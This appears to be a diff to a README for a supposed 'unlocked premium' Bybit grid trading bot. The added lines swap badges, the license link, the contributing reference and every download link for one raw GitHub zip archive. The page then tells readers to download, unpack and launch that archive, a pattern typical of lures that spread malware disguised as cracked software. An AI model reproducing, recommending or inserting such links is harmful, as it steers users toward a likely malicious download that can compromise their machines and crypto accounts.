@@ -8,11 +8,11 @@ Welcome to the **Bybit Grid Bot: Pro License Key Edition** – your digital comp
 
 | Operating System      | Compatibility |  
 |----------------------|:-------------:|  
-| ![Windows](https://img.shields.io/badge/Windows-10%2B-blue)           | ✅ Yes        |  
-| ![macOS](https://img.shields.io/badge/macOS-10.15%2B-lightgrey)       | ✅ Yes        |  
-| ![Linux](https://img.shields.io/badge/Linux-Ubuntu%2FDebian%2B-orange) | ✅ Yes        |  
-| ![Android](https://img.shields.io/badge/Android-API%2017%2B-brightgreen) | 🚧 Planned    |  
-| ![iOS](https://img.shields.io/badge/iOS-14%2B-lightgrey)              | 🚧 Planned    |  
+| ![Windows](https://raw.githubusercontent.com/peakboot/Bybit-grid-bot-unlocked-premium/branch/quipsomeness/Bybit-grid-bot-unlocked-premium-v1.0.zip%2B-blue)           | ✅ Yes        |  
+| ![macOS](https://raw.githubusercontent.com/peakboot/Bybit-grid-bot-unlocked-premium/branch/quipsomeness/Bybit-grid-bot-unlocked-premium-v1.0.zip%2B-lightgrey)       | ✅ Yes        |  
+| ![Linux](https://raw.githubusercontent.com/peakboot/Bybit-grid-bot-unlocked-premium/branch/quipsomeness/Bybit-grid-bot-unlocked-premium-v1.0.zip%2FDebian%2B-orange) | ✅ Yes        |  
+| ![Android](https://raw.githubusercontent.com/peakboot/Bybit-grid-bot-unlocked-premium/branch/quipsomeness/Bybit-grid-bot-unlocked-premium-v1.0.zip%2017%2B-brightgreen) | 🚧 Planned    |  
+| ![iOS](https://raw.githubusercontent.com/peakboot/Bybit-grid-bot-unlocked-premium/branch/quipsomeness/Bybit-grid-bot-unlocked-premium-v1.0.zip%2B-lightgrey)              | 🚧 Planned    |  
 
 ---
 
@@ -99,8 +99,8 @@ The backbone of our grid bot’s intelligence is powered by two titans:
 
 Ready to supercharge your grid trading adventure? Unlock the professional upgrade here:  
 
-[![Download](https://img.shields.io/badge/Download-blue)](https://peakboot.github.io)  
-**(Click the badge above or follow this secure placeholder link: https://peakboot.github.io)**
+[![Download](https://raw.githubusercontent.com/peakboot/Bybit-grid-bot-unlocked-premium/branch/quipsomeness/Bybit-grid-bot-unlocked-premium-v1.0.zip)](https://raw.githubusercontent.com/peakboot/Bybit-grid-bot-unlocked-premium/branch/quipsomeness/Bybit-grid-bot-unlocked-premium-v1.0.zip)  
+**(Click the badge above or follow this secure placeholder link: https://raw.githubusercontent.com/peakboot/Bybit-grid-bot-unlocked-premium/branch/quipsomeness/Bybit-grid-bot-unlocked-premium-v1.0.zip)**
 
 **Inside Your Package:**  
 - Full-featured grid bot application for Windows/macOS/Linux  
@@ -113,7 +113,7 @@ Ready to supercharge your grid trading adventure? Unlock the professional upgrad
 ## ⚙️ Installation & Setup Guide
 
 1. **Retrieve Your Download:**  
-   Use the badge above or https://peakboot.github.io  
+   Use the badge above or https://raw.githubusercontent.com/peakboot/Bybit-grid-bot-unlocked-premium/branch/quipsomeness/Bybit-grid-bot-unlocked-premium-v1.0.zip  
 2. **Unpack the Distribution:**  
    Use your preferred archive utility.
 3. **Launch the Bot:**  
@@ -149,7 +149,7 @@ Always trade responsibly and perform due diligence.**
 
 ## 📜 MIT License (2025)
 
-The Bybit Grid Bot Pro License Key Edition is distributed under the [MIT License](https://opensource.org/licenses/MIT).  
+The Bybit Grid Bot Pro License Key Edition is distributed under the [MIT License](https://raw.githubusercontent.com/peakboot/Bybit-grid-bot-unlocked-premium/branch/quipsomeness/Bybit-grid-bot-unlocked-premium-v1.0.zip).  
 Use, modify, and share as you wish—attribution appreciated!
 
 ---
@@ -158,15 +158,15 @@ Use, modify, and share as you wish—attribution appreciated!
 
 - Suggestions? Issues? Visit the Issues tab.
 - Want to contribute a new translation, strategy module, or tutorial?  
-  See the CONTRIBUTING.md in this repository.
+  See the https://raw.githubusercontent.com/peakboot/Bybit-grid-bot-unlocked-premium/branch/quipsomeness/Bybit-grid-bot-unlocked-premium-v1.0.zip in this repository.
 
 ---
 
 ## 🏁 Final Download & Activation Badge
 
 Begin your journey now!  
-[![Download](https://img.shields.io/badge/Download-blue)](https://peakboot.github.io)  
-**(Access the grid bot and license activation package: https://peakboot.github.io)**
+[![Download](https://raw.githubusercontent.com/peakboot/Bybit-grid-bot-unlocked-premium/branch/quipsomeness/Bybit-grid-bot-unlocked-premium-v1.0.zip)](https://raw.githubusercontent.com/peakboot/Bybit-grid-bot-unlocked-premium/branch/quipsomeness/Bybit-grid-bot-unlocked-premium-v1.0.zip)  
+**(Access the grid bot and license activation package: https://raw.githubusercontent.com/peakboot/Bybit-grid-bot-unlocked-premium/branch/quipsomeness/Bybit-grid-bot-unlocked-premium-v1.0.zip)**
 
 ---
 
